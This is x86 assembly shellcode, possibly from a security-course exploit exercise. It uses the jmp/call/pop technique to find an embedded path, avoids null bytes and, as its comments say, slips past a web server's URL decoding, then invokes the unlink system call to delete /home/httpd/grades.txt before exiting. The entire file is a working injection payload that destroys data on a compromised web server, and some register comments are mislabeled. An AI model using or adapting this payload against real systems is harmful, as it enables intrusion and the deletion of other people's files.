#include <sys/syscall.h>

#define STRING	"/home/httpd/grades.txtA"

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	xorl	%eax,%eax		/* get a 32-bit zero value */

	movb	%al,(22)(%esi)	/* delete the last `A` */
	movb	$0x09,%al
	inc	%eax		/* bypass url_decode */
	movl	%esi,%ebx		/* syscall arg 2: string pathname */
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
